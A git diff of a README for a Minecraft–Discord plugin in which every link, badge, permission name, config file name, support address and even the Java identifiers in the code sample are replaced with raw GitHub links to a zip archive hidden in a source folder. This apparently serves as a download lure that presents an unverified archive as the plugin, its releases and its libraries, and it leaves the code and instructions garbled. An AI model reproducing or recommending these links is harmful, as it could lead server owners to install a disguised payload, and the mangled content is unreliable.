@@ -2,10 +2,10 @@
 
 The most comprehensive Discord integration plugin for Minecraft servers, featuring 17+ modules for complete Discord-Minecraft synchronization with modern slash commands, GUI help system, and advanced voice features.
 
-![Version](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
-![Minecraft](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
-![Discord](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
-![License](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
+![Version](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
+![Minecraft](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
+![Discord](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
+![License](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
 
 ## 🌟 Features
 
@@ -186,7 +186,7 @@ The most comprehensive Discord integration plugin for Minecraft servers, featuri
 
 ## 🚀 Installation
 
-1. **Download** the latest release from [Releases](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
+1. **Download** the latest release from [Releases](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
 2. **Place** the JAR file in your server's `plugins` folder
 3. **Start** your server to generate configuration files
 4. **Stop** your server
@@ -199,7 +199,7 @@ The most comprehensive Discord integration plugin for Minecraft servers, featuri
 
 1. **Create Discord Bot**
    ```
-   1. Go to https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip
+   1. Go to https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip
    2. Create New Application
    3. Go to Bot section
    4. Create Bot and copy token
@@ -207,7 +207,7 @@ The most comprehensive Discord integration plugin for Minecraft servers, featuri
    6. Add bot to your server with Administrator permissions
    ```
 
-2. **Configure https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip**
+2. **Configure https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip**
    ```yaml
    # Admin Discord IDs - These users have full control
    adminIDs:
@@ -346,20 +346,20 @@ features:
 ## 🔑 Permissions
 
 ### Basic Permissions
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Use verification system
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Report players
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Create support tickets
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Access help system
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Use verification system
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Report players
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Create support tickets
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Access help system
 
 ### Admin Permissions
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Access admin commands and help
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Use Discord console commands
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Bypass verification requirement
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Access admin commands and help
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Use Discord console commands
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Bypass verification requirement
 
 ### Module-Specific Permissions
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Create custom embeds
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Make server announcements
-- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` - Manage webhooks
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Create custom embeds
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Make server announcements
+- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Manage webhooks
 
 ## 🎯 New Features Guide
 
@@ -408,11 +408,11 @@ features:
 ```xml
 <repository>
     <id>xreatlabs-repo</id>
-    <url>https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip</url>
+    <url>https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip</url>
 </repository>
 
 <dependency>
-    <groupId>https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip</groupId>
+    <groupId>https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip</groupId>
     <artifactId>xdiscordultimate</artifactId>
     <version>1.0.0</version>
     <scope>provided</scope>
@@ -421,33 +421,33 @@ features:
 
 ### Example API Usage
 ```java
-XDiscordUltimate api = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip();
+XDiscordUltimate api = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip();
 
 // Check if player is verified
-boolean isVerified = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip().isVerified(player);
+boolean isVerified = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().isVerified(player);
 
 // Check if player is admin
-boolean isAdmin = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip().isAdmin(player);
+boolean isAdmin = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().isAdmin(player);
 
 // Create a report
-https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip().createReport(
-    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip(), 
-    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip(), 
+https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().createReport(
+    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip(), 
+    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip(), 
     "Griefing"
 ).thenAccept(reportId -> {
     // Report created with ID
 });
 
 // Create a ticket
-https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip().createTicket(
-    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip(), 
+https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().createTicket(
+    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip(), 
     "Need help with my base"
 ).thenAccept(ticketId -> {
     // Ticket created with ID
 });
 
 // Send TTS announcement
-https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip().getVoiceChannelModule()
+https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().getVoiceChannelModule()
     .announceDiscordMessage("Bot", "Server restarting in 5 minutes!");
 ```
 
@@ -456,7 +456,7 @@ https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquil
 ### Common Issues
 
 1. **Bot not connecting**
-   - Check bot token is correct in https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip
+   - Check bot token is correct in https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip
    - Ensure bot has Administrator permissions
    - Verify guild ID is correct
    - Check all Privileged Gateway Intents are enabled
@@ -468,13 +468,13 @@ https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquil
    - Check bot is online and in your server
 
 3. **Verification not working**
-   - Ensure player has `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` permission
+   - Ensure player has `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` permission
    - Check database connection is working
    - Verify Discord bot is online
    - Check console for error messages
 
 4. **TTS not working**
-   - Ensure https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip is true
+   - Ensure https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip is true
    - Check bot has voice permissions in Discord
    - Verify users are in voice channels
    - Check TTS settings in config
@@ -486,7 +486,7 @@ https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquil
    - Check database is properly configured
 
 6. **GUI Help not opening**
-   - Ensure player has `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip` permission
+   - Ensure player has `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` permission
    - Check for plugin conflicts
    - Verify server version compatibility
    - Check console for errors
@@ -523,20 +523,20 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 🙏 Credits
 
 - **Developer**: XReatLabs Team
-- **Contributors**: See [contributors](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
+- **Contributors**: See [contributors](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
 - **Libraries Used**:
-  - [JDA](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip) - Discord API
-  - [HikariCP](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip) - Database pooling
-  - [OkHttp](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip) - HTTP client
-  - [Gson](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip) - JSON parsing
+  - [JDA](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip) - Discord API
+  - [HikariCP](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip) - Database pooling
+  - [OkHttp](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip) - HTTP client
+  - [Gson](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip) - JSON parsing
 
 ## 📞 Support
 
-- **Discord**: [Join our Discord](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
-- **Issues**: [GitHub Issues](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
-- **Wiki**: [GitHub Wiki](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
-- **Documentation**: [Full Documentation](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip)
-- **Email**: https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/retranquilize/XDiscordUltimate.zip
+- **Discord**: [Join our Discord](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
+- **Issues**: [GitHub Issues](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
+- **Wiki**: [GitHub Wiki](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
+- **Documentation**: [Full Documentation](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
+- **Email**: https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip
 
 ## 🔄 Update History
 
